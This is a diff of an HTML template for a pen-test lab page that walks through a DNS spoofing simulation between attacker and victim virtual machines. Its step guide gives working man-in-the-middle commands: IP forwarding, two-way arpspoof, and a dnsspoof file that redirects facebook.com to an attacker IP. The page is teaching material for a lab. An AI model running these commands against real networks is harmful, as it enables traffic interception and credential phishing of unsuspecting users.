@@ -1,121 +1,129 @@
-{% include "layout/header.html" %}
+{% extends "layout/base.html" %}
 
-<h1 class="title">DNS Spoofing Simulation</h1>
-<p class="subtitle">Simulasi serangan DNS Spoofing menggunakan 2 VM.</p>
+{% block title %}DNS Spoofing Simulation - Virtual Pen Test Lab{% endblock %}
+
+{% block content %}
+<div class="page-header">
+    <div class="d-flex justify-content-between align-items-center">
+        <div>
+            <h1 class="page-title">DNS Spoofing Simulation</h1>
+            <p class="page-subtitle">Simulasi serangan DNS Spoofing untuk membelokkan traffic korban.</p>
+        </div>
+        <div class="vm-status status-active">
+            Lab Active
+        </div>
+    </div>
+</div>
 
 <div class="lab-layout">
-
-    <!-- SIDEBAR -->
-    <aside class="lab-sidebar">
-        <h4>Step by Step</h4>
-
+    <!-- LEFT COLUMN: STEPS -->
+    <aside class="lab-steps">
+        <h3 class="card-title">Guide Instructions</h3>
         <div class="steps-container">
 
             <div class="step-item">
                 <button class="step-title" onclick="toggleStep('step1')">
-                    Step 1 — Start VM
+                    1. Start Virtual Machines
                 </button>
-                <div id="step1" class="step-content">
-                    <p>Nyalakan VM Attacker dan Victim dalam satu jaringan.</p>
+                <div id="step1" class="step-content open">
+                    <p>Nyalakan VM Attacker dan Victim. Pastikan keduanya berada dalam satu jaringan internal yang sama.
+                    </p>
                 </div>
             </div>
 
             <div class="step-item">
                 <button class="step-title" onclick="toggleStep('step2')">
-                    Step 2 — Network Check
+                    2. Network Check
                 </button>
                 <div id="step2" class="step-content">
-                    <pre><code>ip a</code></pre>
-                    <pre><code>ping victim_ip</code></pre>
+                    <p>Cek IP address dan konektivitas (ping):</p>
+                    <code
+                        style="display:block; padding:8px; background:#f1f5f9; border-radius:4px; margin-top:8px;">ip a</code>
+                    <code
+                        style="display:block; padding:8px; background:#f1f5f9; border-radius:4px; margin-top:8px;">ping &lt;victim_ip&gt;</code>
                 </div>
             </div>
 
             <div class="step-item">
                 <button class="step-title" onclick="toggleStep('step3')">
-                    Step 3 — Enable IP Forward
+                    3. Enable IP Forwarding
                 </button>
                 <div id="step3" class="step-content">
-                    <pre><code>echo 1 > /proc/sys/net/ipv4/ip_forward</code></pre>
+                    <p>Aktifkan forwarding agar traffic tetap bisa lewat (agar korban tidak curiga putus koneksi):</p>
+                    <code
+                        style="display:block; padding:8px; background:#f1f5f9; border-radius:4px; margin-top:8px; overflow-x:auto;">echo 1 > /proc/sys/net/ipv4/ip_forward</code>
                 </div>
             </div>
 
             <div class="step-item">
                 <button class="step-title" onclick="toggleStep('step4')">
-                    Step 4 — ARP Spoofing
+                    4. ARP Spoofing
                 </button>
                 <div id="step4" class="step-content">
-                    <pre><code>
-arpspoof -i eth0 -t victim_ip gateway_ip
-arpspoof -i eth0 -t gateway_ip victim_ip
-                    </code></pre>
+                    <p>Lakukan ARP poisoning (Man-in-the-Middle) dua arah:</p>
+                    <code
+                        style="display:block; padding:8px; background:#f1f5f9; border-radius:4px; margin-top:8px; overflow-x:auto;">arpspoof -i eth0 -t &lt;victim_ip&gt; &lt;gateway_ip&gt;</code>
+                    <code
+                        style="display:block; padding:8px; background:#f1f5f9; border-radius:4px; margin-top:8px; overflow-x:auto;">arpspoof -i eth0 -t &lt;gateway_ip&gt; &lt;victim_ip&gt;</code>
                 </div>
             </div>
 
             <div class="step-item">
                 <button class="step-title" onclick="toggleStep('step5')">
-                    Step 5 — DNS Spoofing
+                    5. DNS Spoofing
                 </button>
                 <div id="step5" class="step-content">
-                    <pre><code>
-echo \"facebook.com 192.168.56.100\" > dns.txt
-dnsspoof -i eth0 -f dns.txt
-                    </code></pre>
+                    <p>Buat file <code>dns.txt</code> berisi mapping domain palsu:</p>
+                    <code
+                        style="display:block; padding:8px; background:#f1f5f9; border-radius:4px; margin-top:8px; overflow-x:auto;">echo "facebook.com 192.168.56.100" > dns.txt</code>
+                    <p class="mt-4">Jalankan dnsspoof:</p>
+                    <code
+                        style="display:block; padding:8px; background:#f1f5f9; border-radius:4px; margin-top:8px; overflow-x:auto;">dnsspoof -i eth0 -f dns.txt</code>
                 </div>
             </div>
 
             <div class="step-item">
                 <button class="step-title" onclick="toggleStep('step6')">
-                    Step 6 — Result
+                    6. Verification
                 </button>
                 <div id="step6" class="step-content">
-                    <p>Victim akan diarahkan ke IP palsu saat membuka domain target.</p>
+                    <p>Buka browser di Victim VM dan akses <code>facebook.com</code>. Halaman seharusnya mengarah ke
+                        server attacker (192.168.56.100).</p>
                 </div>
             </div>
 
         </div>
     </aside>
 
-    <!-- MAIN CONTENT -->
-    <main class="lab-content">
-        <h2>Virtual Machine Preview</h2>
-
-
+    <!-- RIGHT COLUMN: VM PREVIEW -->
+    <main class="lab-main">
         <div class="vm-grid">
-
             <!-- Attacker Box -->
             <div class="vm-card">
-                <h3>Attacker VM</h3>
-                <div class="vm-preview placeholder">
-                    <span>Preview Attacker VM (Desain)</span>
+                <h3 class="card-title">Attacker VM (Kali Linux)</h3>
+                <div class="vm-preview">
+                    <span>Attacker Terminal Stream</span>
                 </div>
-                <div class="controls">
-                    <button class="btn primary">Start</button>
-                    <button class="btn">Reset</button>
-                    <span class="status">Status: offline</span>
+                <div class="vm-controls">
+                    <button class="btn btn-primary">Start VM</button>
+                    <button class="btn btn-outline">Reset</button>
+                    <span class="vm-status status-inactive">Offline</span>
                 </div>
             </div>
 
-            <!-- Target Box -->
+            <!-- Victim Box -->
             <div class="vm-card">
-                <h3>Alamat Target</h3>
-                <div class="vm-preview placeholder">
-                    <span>ini adalah alamat ip target</span>
+                <h3 class="card-title">Victim VM (Windows/Linux)</h3>
+                <div class="vm-preview">
+                    <span>Victim Desktop Stream</span>
                 </div>
-                <div class="controls">
-                    <button class="btn primary">Start</button>
-                    <button class="btn">Reset</button>
-                    <span class="status">Status: offline</span>
+                <div class="vm-controls">
+                    <button class="btn btn-outline">Check Status</button>
+                    <span style="font-size: 0.875rem; color: var(--text-muted);">IP: Target</span>
+                </div>
             </div>
-
         </div>
+
     </main>
-
-
-<script>
-function toggleStep(id) {
-    const el = document.getElementById(id);
-    el.style.display = el.style.display === 'block' ? 'none' : 'block';
-}
-</script>
-
-{% include "layout/footer.html" %}
+</div>
+{% endblock %}
